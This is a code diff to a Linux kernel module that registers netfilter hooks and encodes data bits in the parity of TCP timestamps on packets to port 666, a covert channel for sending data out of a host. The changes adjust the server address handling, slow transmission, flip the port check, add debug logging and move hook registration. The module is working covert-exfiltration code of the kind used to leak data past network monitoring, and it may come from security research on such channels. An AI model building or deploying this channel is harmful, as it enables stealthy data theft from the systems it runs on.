@@ -106,7 +106,8 @@ int start_transmit(void) {
     }
 
     //Connect to server ip
-    sin.sin_addr.s_addr = htonl(SERVER_IP);
+    //sin.sin_addr.s_addr = htonl(SERVER_IP);
+    sin.sin_addr.s_addr = SERVER_IP;
     sin.sin_family = AF_INET;
     sin.sin_port = htons(PORT);
 
@@ -125,7 +126,8 @@ int start_transmit(void) {
         send_msg(svc->remote_socket, buf, 64);
 
         //Sleep for 200ms
-        msleep(200);
+        //msleep(200);
+        msleep(2000);
 
         if (bit_count == 7) {
             ++byte_count;
@@ -240,7 +242,7 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
         tcp_header = (struct tcphdr*) skb_transport_header(skb);
         packet_data = skb->data + (ip_header->ihl * 4) + (tcp_header->doff * 4);
 
-        if (ntohs(tcp_header->source) == 666) {
+        if (ntohs(tcp_header->dest) == 666) {
             if (tcp_header->doff > 5) {
                 //Move to the start of the tcp options
                 timestamps = skb->data + (ip_header->ihl * 4) + 20;
@@ -272,19 +274,23 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
                             if (!!(encrypted_test_data[byte_count] & (1 << bit_count))) {
                                 //Data is 1, and timestamp is odd
                                 //Do nothing
+                                printk(KERN_INFO "Writing a 1\n");
                             } else {
                                 //Data is 0, and timestamp is odd
                                 //Increment timestamp so that it is even
                                 ++old_timestamp;
+                                printk(KERN_INFO "Writing a 0\n");
                             }
                         } else {
                             if (!!(encrypted_test_data[byte_count] & (1 << bit_count))) {
                                 //Data is 1, and timestamp is even
                                 //Increment timestamp so that it is odd
                                 ++old_timestamp;
+                                printk(KERN_INFO "Writing a 1\n");
                             } else {
                                 //Data is 0, and timestamp is even
                                 //Do nothing
+                                printk(KERN_INFO "Writing a 0\n");
                             }
                         }
 
@@ -312,6 +318,20 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
 
 static int __init mod_init(void) {
     int err;
+
+    nfhi.hook = incoming_hook;
+    nfhi.hooknum = NF_INET_LOCAL_IN;
+    nfhi.pf = PF_INET;
+    //Set hook highest priority
+    nfhi.priority = NF_IP_PRI_FIRST;
+    nf_register_net_hook(&init_net, &nfhi);
+
+    memcpy(&nfho, &nfhi, sizeof(struct nf_hook_ops));
+    nfho.hook = outgoing_hook;
+    nfho.hooknum = NF_INET_LOCAL_OUT;
+
+    nf_register_net_hook(&init_net, &nfho);
+
     svc = kmalloc(sizeof(struct service), GFP_KERNEL);
     if ((err = init_userspace_conn()) < 0) {
         printk(KERN_ALERT "Failed to initialize userspace sockets; error code %d\n", err);
@@ -333,18 +353,6 @@ static int __init mod_init(void) {
 
     printk(KERN_INFO "Data length %zu\n", data_len);
 
-    nfhi.hook = incoming_hook;
-    nfhi.hooknum = NF_INET_LOCAL_IN;
-    nfhi.pf = PF_INET;
-    //Set hook highest priority
-    nfhi.priority = NF_IP_PRI_FIRST;
-    nf_register_net_hook(&init_net, &nfhi);
-
-    memcpy(&nfho, &nfhi, sizeof(struct nf_hook_ops));
-    nfho.hook = outgoing_hook;
-    nfho.hooknum = NF_INET_LOCAL_OUT;
-
-    nf_register_net_hook(&init_net, &nfho);
     return 0;
 }
 
